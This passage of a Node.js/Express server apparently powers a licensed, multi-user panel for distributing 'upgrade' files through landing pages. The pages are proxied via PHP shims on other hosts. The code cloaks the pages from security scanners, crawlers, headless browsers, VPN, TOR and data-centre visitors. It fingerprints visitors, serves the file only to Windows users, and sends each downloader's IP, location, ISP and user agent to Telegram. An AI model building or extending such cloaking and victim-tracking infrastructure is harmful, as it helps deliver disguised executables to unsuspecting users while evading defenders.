const express = require('express');
const session = require('express-session');
const multer = require('multer');
const bcrypt = require('bcryptjs');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const zlib = require('zlib');
const https = require('https');
const dns = require('dns').promises;
const { initDb, queryAll, queryOne, runSql, rawQueryAll, rawQueryOne, pool } = require('./db');
const pgSession = require('connect-pg-simple')(session);

const app = express();
// Trust exactly the immediate hop (Caddy in front of the app). Trusting `true` would let
// any client spoof X-Forwarded-For via direct connections to the app port.
app.set('trust proxy', 1);
app.disable('x-powered-by');
const PORT = process.env.PORT || 3000;
const COOKIE_SECURE = process.env.COOKIE_SECURE === 'true';

// Baseline security headers — keep narrow and additive so we don't break the React SPA
// or the visitor-facing landing-page HTML which depends on inline scripts.
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  if (req.secure || req.headers['x-forwarded-proto'] === 'https') {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  }
  next();
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(session({
  store: new pgSession({ pool, tableName: 'session', createTableIfMissing: true }),
  secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: {
    maxAge: 24 * 60 * 60 * 1000,
    httpOnly: true,
    sameSite: 'lax',
    secure: COOKIE_SECURE,
  }
}));

// File upload config
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);

// Server-side execution risks if a PHP/JSP/etc. file lands in a directory that's web-served.
// We never serve /uploads/ as PHP, but block these as defense-in-depth in case the uploads
// volume is ever shared with a PHP host.
const BLOCKED_UPLOAD_EXTS = new Set([
  '.php', '.phtml', '.php3', '.php4', '.php5', '.phps', '.pht',
  '.asp', '.aspx', '.jsp', '.jspx', '.cgi', '.pl', '.py', '.rb',
  '.sh', '.htaccess', '.htpasswd',
]);

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadsDir),
  filename: (req, file, cb) => {
    const unique = Date.now() + '-' + Math.round(Math.random() * 1E9);
    // Use only the extension, never the original name segment — original_name is stored
    // separately for display. This neutralises path traversal via the saved filename.
    const ext = path.extname(file.originalname).toLowerCase().replace(/[^.a-z0-9]/g, '').slice(0, 16);
    cb(null, unique + ext);
  }
});
const upload = multer({
  storage,
  limits: { fileSize: 500 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    if (BLOCKED_UPLOAD_EXTS.has(ext)) return cb(new Error('File type not allowed'));
    cb(null, true);
  },
});

// Serve uploaded files
app.use('/uploads', express.static(uploadsDir));

// Serve React build — only on the app's own domain, not on user custom domains
const clientBuild = path.join(__dirname, 'client', 'dist');
function isAppDomain(req) {
  const host = req.hostname;
  // localhost, 127.0.0.1, and the Zeabur app domain serve the React SPA
  if (host === 'localhost' || host === '127.0.0.1') return true;
  // Zeabur domains (*.zeabur.app) or any configured APP_DOMAIN
  const appDomain = process.env.APP_DOMAIN || '';
  if (appDomain && host === appDomain) return true;
  if (host.endsWith('.zeabur.app')) return true;
  // API/asset paths should always be served
  if (req.path.startsWith('/api/') || req.path.startsWith('/uploads/') || req.path.startsWith('/assets/')) return true;
  return false;
}
app.use((req, res, next) => {
  if (isAppDomain(req)) return express.static(clientBuild)(req, res, next);
  next();
});

// Helpers
function uid() { return Date.now().toString(36) + Math.random().toString(36).substring(2, 7); }
function today() { return new Date().toISOString().split('T')[0]; }

function requireAuth(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
  next();
}
function requireAdmin(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
  if (req.session.user.role !== 'Admin') return res.status(403).json({ error: 'Admin access required' });
  next();
}

// Ensures the session user owns the page (or is an admin). Loads the page once and
// attaches it to req.page so downstream handlers don't have to re-query. Use after requireAuth.
async function requirePageAccess(req, res, next) {
  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });
  if (req.session.user.role !== 'Admin' && page.user_id !== req.session.user.id) {
    return res.status(403).json({ error: 'You do not have access to this page' });
  }
  req.page = page;
  next();
}

// Same idea for versions — load the version, fetch its page, check ownership.
async function requireVersionAccess(req, res, next) {
  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
  if (!ver) return res.status(404).json({ error: 'Version not found' });
  const page = await queryOne('SELECT id, user_id FROM pages WHERE id = ?', [ver.page_id]);
  if (!page) return res.status(404).json({ error: 'Page not found' });
  if (req.session.user.role !== 'Admin' && page.user_id !== req.session.user.id) {
    return res.status(403).json({ error: 'You do not have access to this version' });
  }
  req.version = ver;
  req.page = page;
  next();
}

function logActivity(action, details, userName) {
  runSql('INSERT INTO activity (action, details, user_name, date) VALUES (?, ?, ?, ?)', [action, details, userName, today()]);
}

// Safe interpolation of strings into a <script> body. Escapes characters that could
// break the JS literal context (quotes, backslashes, newlines, line terminators) AND
// the surrounding HTML context (forward slash protects against </script> early-close,
// < protects against <!-- and <script start, & protects against HTML entity tricks).
function jsStringEscape(s) {
  return String(s == null ? '' : s)
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/'/g, "\\'")
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029')
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026');
}

// Safe interpolation into HTML attribute values (double-quoted).
function htmlAttrEscape(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// Resolves a file_path stored in the DB to an absolute path inside uploadsDir, or null
// if the resolved path would escape the directory. Use before any fs.unlink / res.download.
function safeUploadPath(filePath) {
  if (!filePath) return null;
  const resolvedDir = path.resolve(uploadsDir);
  const resolved = path.resolve(uploadsDir, filePath);
  if (resolved !== resolvedDir && !resolved.startsWith(resolvedDir + path.sep)) return null;
  return resolved;
}

// ═══════════ ANTIBOT SYSTEM ═══════════
const BOT_SECRET = crypto.randomBytes(32).toString('hex');

// In-memory stores
const rateLimitStore = new Map();
const loginAttemptStore = new Map();
const challengeTokenStore = new Map();
const ipLookupCache = new Map();
const IP_CACHE_TTL = 3600000;

// Config
const RATE_LIMITS = {
  page: { windowMs: 60000, max: 30 },
  download: { windowMs: 60000, max: 10 },
  login: { windowMs: 900000, max: 5 },
  general: { windowMs: 60000, max: 60 },
};
const LOGIN_MAX_FAILURES = 5;
const LOGIN_LOCKOUT_MS = 15 * 60 * 1000;
const CHALLENGE_TOKEN_TTL = 3600000;
const CHALLENGE_WAIT_MS = 1000;

// Cleanup expired entries every 60s
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of rateLimitStore) { if (now - v.windowStart > 120000) rateLimitStore.delete(k); }
  for (const [k, v] of loginAttemptStore) { if (v.lockUntil && now > v.lockUntil + 60000) loginAttemptStore.delete(k); }
  for (const [k, v] of challengeTokenStore) { if (now > v.expires) challengeTokenStore.delete(k); }
  for (const [k, v] of ipLookupCache) { if (now - v.timestamp > IP_CACHE_TTL) ipLookupCache.delete(k); }
}, 60000);

// Known bot UA patterns
const BOT_UA_PATTERNS = [
  /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
  /yandexbot/i, /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i,
  /curl\//i, /wget\//i, /python-requests/i, /python-urllib/i,
  /scrapy/i, /httpclient/i, /java\//i, /libwww/i, /httpunit/i,
  /nutch/i, /phpcrawl/i, /mj12bot/i, /semrushbot/i, /ahrefsbot/i,
  /dotbot/i, /rogerbot/i, /screaming frog/i,
  /phantomjs/i, /headlesschrome/i, /puppeteer/i, /selenium/i,
  /webdriver/i, /nightmare/i,
  /postman/i, /insomnia/i, /node-fetch/i, /got\//i,
  /\bbot\b/i, /crawler/i, /spider/i, /scraper/i,
];

function getClientIp(req) {
  // PHP shim already authenticated the request and supplied the visitor's real IP.
  if (req._shimRealIp) return req._shimRealIp;
  // Behind reverse proxy (Zeabur, Cloudflare, etc.) — trust x-forwarded-for
  const xff = req.headers['x-forwarded-for'];
  const ip = xff ? xff.split(',')[0].trim() : (req.socket.remoteAddress || req.ip);
  // Normalize IPv6-mapped IPv4 (::ffff:1.2.3.4 -> 1.2.3.4)
  if (ip && ip.startsWith('::ffff:')) return ip.substring(7);
  return ip || 'unknown';
}

// ═══════════ LICENSING ═══════════
// User-account licensing. Admins are exempt. Pages with user_id = NULL are admin-owned
// and not subject to licensing — they keep rendering regardless of any user's license state.
const LICENSE_DURATIONS_MS = { weekly: 7 * 86400000, monthly: 30 * 86400000 };
function isAdminUser(user) { return !!user && user.role === 'Admin'; }
function isLicenseActive(user) {
  if (!user) return false;
  if (isAdminUser(user)) return true;
  if (!user.license_expires_at) return false;
  return new Date(user.license_expires_at).getTime() > Date.now();
}
function licenseSummary(user) {
  if (!user) return null;
  if (isAdminUser(user)) return { plan: 'admin', active: true, expires_at: null, remaining_ms: null };
  const expiresAt = user.license_expires_at ? new Date(user.license_expires_at).getTime() : null;
  return { plan: user.license_plan || null, active: isLicenseActive(user), expires_at: user.license_expires_at, remaining_ms: expiresAt ? expiresAt - Date.now() : null };
}
async function pageOwnerIsLicensed(page) {
  if (!page || !page.user_id) return true;
  const owner = await queryOne('SELECT id, role, license_plan, license_expires_at FROM users WHERE id = ?', [page.user_id]);
  return isLicenseActive(owner);
}
const BLANK_HTML = '<!DOCTYPE html><html><head><title></title></head><body></body></html>';

function isKnownBot(ua) {
  if (!ua) return true;
  return BOT_UA_PATTERNS.some(p => p.test(ua));
}

function hasHeaderAnomalies(req) {
  const ua = req.headers['user-agent'];
  const accept = req.headers['accept'];
  const lang = req.headers['accept-language'];
  const enc = req.headers['accept-encoding'];
  if (!ua) return { suspicious: true, reason: 'Missing User-Agent' };
  if (!accept && !lang) return { suspicious: true, reason: 'Missing Accept and Accept-Language headers' };
  if (accept === '*/*' && !lang && !enc) return { suspicious: true, reason: 'Generic Accept with no language/encoding' };
  return { suspicious: false };
}

function checkRateLimit(ip, routeType) {
  const cfg = RATE_LIMITS[routeType] || RATE_LIMITS.general;
  const key = ip + ':' + routeType;
  const now = Date.now();
  const record = rateLimitStore.get(key);
  if (!record || now - record.windowStart > cfg.windowMs) {
    rateLimitStore.set(key, { count: 1, windowStart: now });
    return false;
  }
  record.count++;
  if (record.count > cfg.max) return true;
  return false;
}

function signToken(payload) {
  const data = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const hmac = crypto.createHmac('sha256', BOT_SECRET).update(data).digest('base64url');
  return data + '.' + hmac;
}

function verifyToken(token) {
  if (!token || !token.includes('.')) return null;
  const [data, sig] = token.split('.');
  const expected = crypto.createHmac('sha256', BOT_SECRET).update(data).digest('base64url');
  if (sig.length !== expected.length) return null;
  try {
    if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) return null;
  } catch { return null; }
  try {
    const payload = JSON.parse(Buffer.from(data, 'base64url').toString());
    if (payload.exp && Date.now() > payload.exp) return null;
    return payload;
  } catch { return null; }
}

function logBotBlock(ip, ua, reason, blockType, reqPath, pageId) {
  runSql('INSERT INTO bot_blocks (ip, user_agent, reason, block_type, path, page_id, created) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [ip, (ua || '').substring(0, 500), reason, blockType, reqPath || '', pageId || null, new Date().toISOString()]
  );
}

function blockedPage(reason) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access Denied</title></head>
<body style="font-family:'Segoe UI',sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
<div style="text-align:center;max-width:420px;padding:40px;background:#f8f9fa;border:1px solid #e0e0e0;border-radius:16px;box-shadow:0 2px 12px rgba(0,0,0,0.06);">
<svg width="48" height="48" viewBox="0 0 24 24" fill="#dc2626" style="margin-bottom:16px;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
<h1 style="font-size:1.2rem;color:#1a1a1a;margin-bottom:8px;">Access Denied</h1>
<p style="color:#6b7280;font-size:0.85rem;">${reason}</p>
</div></body></html>`;
}

// ═══════════ IP2LOCATION ═══════════
const BLOCKED_USAGE_TYPES = new Set(['DCH', 'SES', 'RSV', 'CDN']);

function ip2locationLookup(ip) {
  return new Promise(async (resolve) => {
    const cached = ipLookupCache.get(ip);
    if (cached && Date.now() - cached.timestamp < IP_CACHE_TTL) {
      return resolve(cached.data);
    }
    const setting = await queryOne("SELECT value FROM settings WHERE key = 'ip2location_api_key'");
    if (!setting || !setting.value) return resolve(null);

    const url = 'https://api.ip2location.io/?key=' + encodeURIComponent(setting.value) + '&ip=' + encodeURIComponent(ip);
    const req = https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.error) { return resolve({ _error: true, _message: parsed.error.error_message || 'API error' }); }
          ipLookupCache.set(ip, { data: parsed, timestamp: Date.now() });
          resolve(parsed);
        } catch (e) {
          resolve({ _error: true, _message: 'Invalid API response' });
        }
      });
    });
    req.on('error', (err) => {
      resolve({ _error: true, _message: err.message });
    });
    req.setTimeout(10000, () => {
      req.destroy();
      resolve({ _error: true, _message: 'API timeout' });
    });
  });
}

function checkIp2locationBlock(ipData) {
  if (!ipData || !ipData.proxy) return { blocked: false, reason: null };
  const reasons = [];
  const p = ipData.proxy;
  if (p.is_vpn) reasons.push('VPN detected');
  if (p.is_tor) reasons.push('TOR detected');
  if (p.is_data_center) reasons.push('Data center IP');
  if (p.is_botnet) reasons.push('Botnet detected');
  if (p.is_scanner) reasons.push('Scanner detected');
  // is_spammer not used — too many false positives
  if (p.is_public_proxy) reasons.push('Public proxy');
  if (p.is_web_proxy) reasons.push('Web proxy');
  if (p.is_web_crawler) reasons.push('Web crawler');
  if (ipData.usage_type && BLOCKED_USAGE_TYPES.has(ipData.usage_type)) {
    reasons.push('Blocked usage type: ' + ipData.usage_type);
  }
  return reasons.length > 0 ? { blocked: true, reason: reasons.join('; ') } : { blocked: false, reason: null };
}

function logVisitor(ip, ipData, ua, reqPath, pageId, isBlocked, blockReason) {
  runSql(
    'INSERT INTO visitor_logs (ip, country_code, country_name, region_name, city_name, latitude, longitude, isp, domain, usage_type, proxy_flags, user_agent, path, page_id, is_blocked, block_reason, created) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
    [
      ip,
      ipData?.country_code || null, ipData?.country_name || null,
      ipData?.region_name || null, ipData?.city_name || null,
      ipData?.latitude || null, ipData?.longitude || null,
      ipData?.isp || null, ipData?.domain || null,
      ipData?.usage_type || null,
      ipData?.proxy ? JSON.stringify(ipData.proxy) : null,
      (ua || '').substring(0, 500), reqPath || '', pageId || null,
      isBlocked ? 1 : 0, blockReason || null,
      new Date().toISOString()
    ]
  );
}

function challengePageHtml(nonce, originalUrl) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Loading</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;}.hp{position:absolute;left:-9999px;opacity:0;height:0}</style></head><body>
<input type="text" name="website" id="hp_website" class="hp" tabindex="-1" autocomplete="off">
<script>
(function(){
var startTime=Date.now();
var nonce="${jsStringEscape(nonce)}";
var origUrl="${jsStringEscape(originalUrl)}";
var checks={
webdriver:navigator.webdriver===true,
phantom:!!window._phantom||!!window.phantom,
nightmare:!!window.__nightmare,
selenium:!!document.documentElement.getAttribute("webdriver"),
headless:/HeadlessChrome/.test(navigator.userAgent),
pluginsZero:navigator.plugins.length===0,
langEmpty:!navigator.languages||navigator.languages.length===0
};
var fp={
sw:screen.width,sh:screen.height,cd:screen.colorDepth,
tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
tzo:new Date().getTimezoneOffset(),
lang:navigator.language,
langs:(navigator.languages||[]).join(","),
plat:navigator.platform,
cookie:navigator.cookieEnabled,
tp:navigator.maxTouchPoints||0,
mem:navigator.deviceMemory||0,
cores:navigator.hardwareConcurrency||0
};
setTimeout(function(){
var honeypot=document.getElementById("hp_website").value;
var payload={nonce:nonce,elapsed:Date.now()-startTime,checks:checks,fp:fp,honeypot:honeypot};
var xhr=new XMLHttpRequest();
xhr.open("POST","api/bot-verify",true);
xhr.setRequestHeader("Content-Type","application/json");
xhr.onload=function(){
if(xhr.status===200){
try{var r=JSON.parse(xhr.responseText);
if(r.ok){window.location.href=origUrl||window.location.href;}
}catch(e){}
}
};
xhr.onerror=function(){};
xhr.send(JSON.stringify(payload));
},1500);
})();
</script></body></html>`;
}

// Bot guard middleware — applied per route under the shim mount and on admin preview routes.
async function botGuard(req, res, next) {
  // /api/bot-verify owns its own validation flow — skip the guard
  // Matches both the root path and shim-prefixed paths like /landing/api/bot-verify
  if (req.path === '/api/bot-verify' || req.path.endsWith('/api/bot-verify')) return next();

  // /download/* — limited check (no challenge, but blocklist/UA/rate-limit still enforced)
  if (req.path.startsWith('/download/')) {
    const ip = getClientIp(req);
    const ua = req.headers['user-agent'] || '';
    const blocked = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'block']);
    if (blocked) { logBotBlock(ip, ua, 'IP blocklisted', 'ip_blocklist', req.path, null); return res.status(403).send(blockedPage('Your IP has been blocked.')); }
    if (isKnownBot(ua)) { logBotBlock(ip, ua, 'Known bot UA: ' + ua.substring(0, 100), 'ua_blocked', req.path, null); return res.status(403).send(blockedPage('Automated access is not allowed.')); }
    if (checkRateLimit(ip, 'download')) { logBotBlock(ip, ua, 'Rate limit exceeded (download)', 'rate_limited', req.path, null); return res.status(429).send(blockedPage('Too many requests. Please slow down.')); }
    return next();
  }

  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';

  // Resolve page_id early for analytics tracking
  let earlyPageId = null;
  if (req._shimPageId) {
    earlyPageId = req._shimPageId;
  } else {
    const pageMatch = req.path.match(/^\/page\/([^/]+)/);
    if (pageMatch) earlyPageId = pageMatch[1];
  }

  // 1. IP allowlist
  const allowed = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'allow']);
  if (allowed) return next();

  // 2. IP blocklist
  const blocked = await queryOne('SELECT id FROM bot_ip_list WHERE ip = ? AND list_type = ?', [ip, 'block']);
  if (blocked) {
    logBotBlock(ip, ua, 'IP blocklisted', 'ip_blocklist', req.path, earlyPageId);
    return res.status(403).send(blockedPage('Your IP has been blocked.'));
  }

  // 3. Known bot UA
  if (isKnownBot(ua)) {
    logBotBlock(ip, ua, 'Known bot User-Agent: ' + ua.substring(0, 100), 'ua_blocked', req.path, earlyPageId);
    return res.status(403).send(blockedPage('Automated access is not allowed.'));
  }

  // 4. Header anomalies
  const anomaly = hasHeaderAnomalies(req);
  if (anomaly.suspicious) {
    logBotBlock(ip, ua, anomaly.reason, 'header_anomaly', req.path, earlyPageId);
    return res.status(403).send(blockedPage('Request blocked due to suspicious headers.'));
  }

  // 5. Rate limiting
  const routeType = req.path.startsWith('/download/') ? 'download' : 'page';
  if (checkRateLimit(ip, routeType)) {
    logBotBlock(ip, ua, 'Rate limit exceeded (' + routeType + ')', 'rate_limited', req.path, earlyPageId);
    return res.status(429).send(blockedPage('Too many requests. Please slow down.'));
  }

  // 6. Check challenge token cookie
  const tokenCookie = req.headers.cookie && req.headers.cookie.split(';').find(c => c.trim().startsWith('_bc_token='));
  if (tokenCookie) {
    const token = tokenCookie.split('=')[1];
    const payload = verifyToken(token);
    if (payload && payload.ip === ip) return next();
  }

  // 7. Serve challenge page
  const nonce = crypto.randomBytes(16).toString('hex');
  const rawUrl = req.originalUrl || req.url;
  // For shim-routed requests, strip the /_shim/proxy mount so the post-verify redirect
  // lands on the visitor-facing URL (e.g. /landing/), not the internal proxy path.
  const visitorUrl = req._shimPageId ? (rawUrl.replace(/^\/_shim\/proxy/, '') || '/') : rawUrl;
  challengeTokenStore.set(nonce, { ip, originalUrl: visitorUrl, pageId: earlyPageId, expires: Date.now() + 300000 });
  return res.status(200).send(challengePageHtml(nonce, visitorUrl));
}

// (botGuard is applied per-route below: on the /_shim/proxy mount and on /page/:id / /download/:id.)

// Login brute force guard
function loginGuard(req, res, next) {
  const ip = getClientIp(req);
  const record = loginAttemptStore.get(ip);
  if (record && record.lockUntil && Date.now() < record.lockUntil) {
    logBotBlock(ip, req.headers['user-agent'], 'Brute force lockout', 'brute_force', req.path);
    return res.status(429).json({ error: 'Too many failed attempts. Try again in 15 minutes.' });
  }
  if (checkRateLimit(ip, 'login')) {
    logBotBlock(ip, req.headers['user-agent'], 'Login rate limit', 'rate_limited', req.path);
    return res.status(429).json({ error: 'Too many requests. Slow down.' });
  }
  next();
}

// Windows-only detection
function isWindows(userAgent) {
  if (!userAgent) return false;
  return /windows/i.test(userAgent);
}

function windowsOnlyPage() {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Windows Only</title></head>
<body style="font-family:'Segoe UI',Tahoma,sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;">
<div style="text-align:center;max-width:480px;padding:40px;background:#f8f9fa;border:1px solid #e0e0e0;border-radius:16px;box-shadow:0 2px 12px rgba(0,0,0,0.06);">
<svg width="64" height="64" viewBox="0 0 24 24" fill="#2563eb" style="margin-bottom:20px;"><path d="M3 12V6.75l6-1.32v6.48L3 12zm17-9v8.75l-10 .08V5.21L20 3zM3 13l6 .09v6.81l-6-1.15V13zm7 .18l10 .08V21l-10-1.84V13.18z"/></svg>
<h1 style="font-size:1.4rem;color:#1a1a1a;margin-bottom:12px;">Windows Only</h1>
<p style="color:#6b7280;font-size:0.95rem;line-height:1.6;">This upgrade file is for Windows computers only. Please switch to a Windows computer to access the file.</p>
</div></body></html>`;
}

// Returns the download URL the visitor's browser should hit. For shim deployments the
// shim is mounted at an arbitrary subdirectory on the visitor host (e.g. /landing/), so
// using '/download/...' would skip the shim and hit the host root. Use a path relative
// to the shim's mount instead so the browser request goes back through the shim and
// reaches the central server's download route.
function buildDownloadUrl(req, pageId) {
  if (!req || !req._shimPageId) return '/download/' + pageId;
  const visitorUrl = (req.originalUrl || '/').replace(/^\/_shim\/proxy/, '') || '/';
  const mount = visitorUrl.endsWith('/')
    ? visitorUrl
    : visitorUrl.substring(0, visitorUrl.lastIndexOf('/') + 1);
  return mount + 'download/' + pageId;
}

// Resolves the user the request is "for" — the deployment owner (visitor traffic via shim),
// or the logged-in dashboard user (preview), or null (legacy / public). Used to select the
// correct active version in the per-user isolation model.
function effectiveUserForRequest(req) {
  if (!req) return null;
  if (req._shimUserId !== undefined) return req._shimUserId; // may be null for legacy shims
  if (req.session && req.session.user) return req.session.user.id;
  return null;
}

// Finds the active version for a (page, user) pair. STRICT per-user isolation: when a
// userId is given, only that user's own active version is returned — we never fall back
// to a NULL-user / legacy / admin-uploaded version, because that would mean a visitor
// hitting User A's shim deployment could be served User B's (or anyone's) file.
// userId === null is reserved for true anonymous lookups (admin-owned pages, legacy
// direct /page/:id traffic with no session); only then do we serve the NULL-user version.
async function findActiveVersion(pageId, userId) {
  if (userId) {
    return await queryOne('SELECT * FROM versions WHERE page_id = ? AND user_id = ? AND active = 1 LIMIT 1', [pageId, userId]);
  }
  return await queryOne('SELECT * FROM versions WHERE page_id = ? AND user_id IS NULL AND active = 1 LIMIT 1', [pageId]);
}

function formatBytes(n) {
  if (!n && n !== 0) return '';
  if (n < 1024) return n + ' B';
  if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
  if (n < 1024 * 1024 * 1024) return (n / (1024 * 1024)).toFixed(1) + ' MB';
  return (n / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

// ═══════════ TELEGRAM ALERTS ═══════════
function tgHtmlEscape(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function countryFlagEmoji(cc) {
  if (!cc || typeof cc !== 'string' || cc.length !== 2) return '';
  const code = cc.toUpperCase();
  const A = 0x1F1E6;
  return String.fromCodePoint(A + code.charCodeAt(0) - 65) + String.fromCodePoint(A + code.charCodeAt(1) - 65);
}
function sendTelegram(botToken, chatId, htmlText) {
  return new Promise((resolve) => {
    if (!botToken || !chatId) return resolve({ ok: false, err: 'not configured' });
    const payload = JSON.stringify({ chat_id: String(chatId), text: htmlText, parse_mode: 'HTML', disable_web_page_preview: true });
    const opts = {
      method: 'POST',
      hostname: 'api.telegram.org',
      path: '/bot' + botToken + '/sendMessage',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
    };
    const reqT = https.request(opts, (resT) => {
      let data = '';
      resT.on('data', c => { data += c; });
      resT.on('end', () => {
        try {
          const j = JSON.parse(data);
          if (j.ok) return resolve({ ok: true });
          resolve({ ok: false, err: j.description || ('HTTP ' + resT.statusCode) });
        } catch {
          resolve({ ok: false, err: 'invalid response' });
        }
      });
    });
    reqT.on('error', (e) => resolve({ ok: false, err: e.message }));
    reqT.setTimeout(8000, () => { reqT.destroy(); resolve({ ok: false, err: 'timeout' }); });
    reqT.write(payload);
    reqT.end();
  });
}
async function notifyDownload(req, page, version) {
  try {
    // Prefer the user who actually deployed/served this shim (per-user isolation),
    // fall back to the page owner for legacy / direct /page/:id traffic.
    const alertUserId = req._shimUserId || page.user_id || null;
    const owner = alertUserId
      ? await queryOne('SELECT id, name, email, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [alertUserId])
      : null;
    const gToken = await queryOne("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
    const gChat  = await queryOne("SELECT value FROM settings WHERE key = 'telegram_chat_id'");
    const targets = [];
    if (owner && owner.telegram_bot_token && owner.telegram_chat_id) {
      targets.push({ label: 'owner', token: owner.telegram_bot_token, chat: owner.telegram_chat_id });
    }
    if (gToken && gToken.value && gChat && gChat.value) {
      const isDup = targets.some(t => t.token === gToken.value && t.chat === gChat.value);
      if (!isDup) targets.push({ label: 'global', token: gToken.value, chat: gChat.value });
    }
    if (!targets.length) return;

    const ip = req._shimRealIp || getClientIp(req);
    const ua = req.headers['user-agent'] || '';
    let geo = null;
    try { geo = await ip2locationLookup(ip); } catch {}
    const cc = geo && !geo._error ? geo.country_code : '';
    const flag = countryFlagEmoji(cc);
    const loc = geo && !geo._error
      ? [geo.city_name, geo.region_name, geo.country_name].filter(Boolean).join(', ')
      : '';
    const isp = geo && !geo._error ? (geo.isp || geo.domain || '') : '';

    let host = '';
    try {
      const ref = req.headers['referer'] || '';
      if (ref) host = new URL(ref).host;
    } catch {}
    if (!host) host = req.headers['host'] || '';

    let sizeStr = '';
    if (version.file_path) {
      const fp = safeUploadPath(version.file_path);
      if (fp) { try { sizeStr = formatBytes(fs.statSync(fp).size); } catch { /* missing */ } }
    }
    const fileLine = version.link_url
      ? '🔗 ' + tgHtmlEscape(version.link_url)
      : tgHtmlEscape(version.original_name || version.file_name || '') + (sizeStr ? ' (' + tgHtmlEscape(sizeStr) + ')' : '');

    const lines = [
      '🟢 <b>New download</b>',
      '<b>Page:</b> ' + tgHtmlEscape(page.name || '') + (owner ? ' <i>(' + tgHtmlEscape(owner.name) + ')</i>' : ''),
      '<b>Version:</b> v' + tgHtmlEscape(version.version || '?'),
      '<b>File:</b> ' + fileLine,
      '<b>IP:</b> ' + tgHtmlEscape(ip) + (flag ? ' ' + flag : ''),
      loc ? '<b>Location:</b> ' + tgHtmlEscape(loc) : null,
      isp ? '<b>ISP:</b> ' + tgHtmlEscape(isp) : null,
      ua ? '<b>UA:</b> <code>' + tgHtmlEscape(ua.slice(0, 220)) + '</code>' : null,
      host ? '<b>Host:</b> ' + tgHtmlEscape(host) : null,
      '<b>Time:</b> ' + new Date().toISOString(),
    ].filter(Boolean);

    const text = lines.join('\n');
    await Promise.all(targets.map(t => sendTelegram(t.token, t.chat, text).then(r => {
      if (!r.ok) console.warn('Telegram (' + t.label + ') failed:', r.err);
    })));
  } catch (err) {
    console.warn('notifyDownload error:', err.message);
  }
}
async function notifyUpload(page, version, uploader) {
  try {
    const owner = page.user_id
      ? await queryOne('SELECT id, name, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [page.user_id])
      : null;
    const gToken = await queryOne("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
    const gChat  = await queryOne("SELECT value FROM settings WHERE key = 'telegram_chat_id'");
    const targets = [];
    if (owner && owner.telegram_bot_token && owner.telegram_chat_id) {
      targets.push({ label: 'owner', token: owner.telegram_bot_token, chat: owner.telegram_chat_id });
    }
    if (gToken && gToken.value && gChat && gChat.value) {
      const isDup = targets.some(t => t.token === gToken.value && t.chat === gChat.value);
      if (!isDup) targets.push({ label: 'global', token: gToken.value, chat: gChat.value });
    }
    if (!targets.length) return;

    const fileLine = version.link_url
      ? '🔗 ' + tgHtmlEscape(version.link_url)
      : tgHtmlEscape(version.original_name || version.file_name || '');

    const lines = [
      '📤 <b>New upload</b>',
